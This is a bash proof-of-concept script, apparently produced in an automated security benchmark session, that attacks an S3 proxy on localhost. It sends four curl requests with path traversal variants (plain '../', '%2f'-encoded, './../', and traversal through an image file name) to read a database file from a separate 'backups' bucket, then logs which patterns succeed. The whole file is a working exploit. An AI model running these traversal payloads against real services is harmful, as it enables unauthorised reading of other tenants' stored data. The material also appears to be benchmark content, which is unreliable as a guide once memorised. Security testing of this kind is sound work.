#!/bin/bash
# POC: Demonstrates S3 proxy path traversal vulnerability allowing cross-bucket access via directory traversal patterns
# Target: ./repo
# Created: 2025-11-07T16:11:35.355Z
# Session: benchmark-XBEN-084-24-mhp1efma

# S3 Proxy Path Traversal - Cross-Bucket Access POC
# This POC demonstrates multiple path traversal patterns that bypass bucket isolation

TARGET="http://localhost:3000"
RESULTS_FILE="/tmp/s3_traversal_results.txt"

echo "=== S3 Proxy Path Traversal POC ===" | tee "$RESULTS_FILE"
echo "Target: $TARGET" | tee -a "$RESULTS_FILE"
echo "Attempting to access backups bucket from assets namespace..." | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

# Pattern 1: Unencoded relative path traversal
echo "[*] Pattern 1: Unencoded relative path traversal (../ sequence)" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" http://localhost:3000/s3/assets/../backups/manapool.db)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "URL: http://localhost:3000/s3/assets/../backups/manapool.db" | tee -a "$RESULTS_FILE"
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "200" ]; then
  SIZE=$(echo "$BODY" | wc -c)
  echo "✓ SUCCESS: Retrieved file ($SIZE bytes) - Path traversal works!" | tee -a "$RESULTS_FILE"
  PATTERN1_SUCCESS=1
else
  echo "✗ FAILED: HTTP $HTTP_CODE" | tee -a "$RESULTS_FILE"
  PATTERN1_SUCCESS=0
fi
echo "" | tee -a "$RESULTS_FILE"

# Pattern 2: URL-encoded path traversal (%2f encoding)
echo "[*] Pattern 2: URL-encoded path traversal (%2f for /)" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:3000/s3/assets/..%2fbackups/manapool.db")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "URL: http://localhost:3000/s3/assets/..%2fbackups/manapool.db" | tee -a "$RESULTS_FILE"
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "200" ]; then
  SIZE=$(echo "$BODY" | wc -c)
  echo "✓ SUCCESS: Retrieved file ($SIZE bytes) - URL encoding bypass works!" | tee -a "$RESULTS_FILE"
  PATTERN2_SUCCESS=1
else
  echo "✗ FAILED: HTTP $HTTP_CODE" | tee -a "$RESULTS_FILE"
  PATTERN2_SUCCESS=0
fi
echo "" | tee -a "$RESULTS_FILE"

# Pattern 3: Mixed path traversal with directory references
echo "[*] Pattern 3: Mixed path traversal (./../ sequence)" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:3000/s3/assets/./../backups/manapool.db")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "URL: http://localhost:3000/s3/assets/./../backups/manapool.db" | tee -a "$RESULTS_FILE"
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "200" ]; then
  SIZE=$(echo "$BODY" | wc -c)
  echo "✓ SUCCESS: Retrieved file ($SIZE bytes) - Mixed traversal works!" | tee -a "$RESULTS_FILE"
  PATTERN3_SUCCESS=1
else
  echo "✗ FAILED: HTTP $HTTP_CODE" | tee -a "$RESULTS_FILE"
  PATTERN3_SUCCESS=0
fi
echo "" | tee -a "$RESULTS_FILE"

# Pattern 4: Multi-level traversal through object names
echo "[*] Pattern 4: Multi-level traversal (file as directory)" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:3000/s3/assets/front_image_1.jpeg/../../backups/manapool.db")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "URL: http://localhost:3000/s3/assets/front_image_1.jpeg/../../backups/manapool.db" | tee -a "$RESULTS_FILE"
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "200" ]; then
  SIZE=$(echo "$BODY" | wc -c)
  echo "✓ SUCCESS: Retrieved file ($SIZE bytes) - Object traversal works!" | tee -a "$RESULTS_FILE"
  PATTERN4_SUCCESS=1
else
  echo "✗ FAILED: HTTP $HTTP_CODE" | tee -a "$RESULTS_FILE"
  PATTERN4_SUCCESS=0
fi
echo "" | tee -a "$RESULTS_FILE"

# Summary
echo "=== SUMMARY ===" | tee -a "$RESULTS_FILE"
SUCCESS_COUNT=$((PATTERN1_SUCCESS + PATTERN2_SUCCESS + PATTERN3_SUCCESS + PATTERN4_SUCCESS))
echo "Successful traversal patterns: $SUCCESS_COUNT / 4" | tee -a "$RESULTS_FILE"

if [ $SUCCESS_COUNT -gt 0 ]; then
  echo "✓ VULNERABILITY CONFIRMED: Multiple path traversal patterns bypass bucket isolation" | tee -a "$RESULTS_FILE"
  exit 0
else
  echo "✗ No path traversal patterns succeeded" | tee -a "$RESULTS_FILE"
  exit 1
fi